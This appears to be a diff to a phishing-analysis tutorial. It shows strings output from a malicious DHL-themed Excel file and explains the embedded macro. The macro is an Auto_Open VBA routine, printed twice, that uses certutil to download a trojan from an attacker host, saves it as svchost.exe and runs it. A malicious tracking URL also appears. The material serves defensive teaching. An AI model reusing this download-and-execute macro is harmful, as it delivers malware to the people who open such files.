@@ -89,7 +89,36 @@ file DHL-Shipment-Notice.xlsx
 strings DHL-Shipment-Notice.xlsx
 ```
   ```
-  Sub Auto_Open()
+  Shipment ID: DHL-7829341-LNX
+Sender: Global Trading Co.
+Destination: Jakarta, Indonesia
+Weight: 2.5 kg
+Status: In Transit
+U~aq
+Sub Auto_Open()
   Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
-```
+End Sub
+}PfJh
+#h]5
+http://dhl-tracking.shipment-update.malicious-domain.xyz/track?id=DHL-7829341
+H.62
+hkHP
+t{%dhrD7
+fp-e
+(Ffe
 
+```
+Focus on 
+
+```
+Sub Auto_Open()
+Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
+```
+Once the malware has been successfully downloaded from the attacker’s server, it is saved with a name similar to that of a genuine Windows process and runs immediately after being downloaded.
+
+
+## Email Analysis With Tools
+
+Using tools to analyze malicious emails greatly helps make the analysis process much faster and more efficient.
+
+**Case 3**
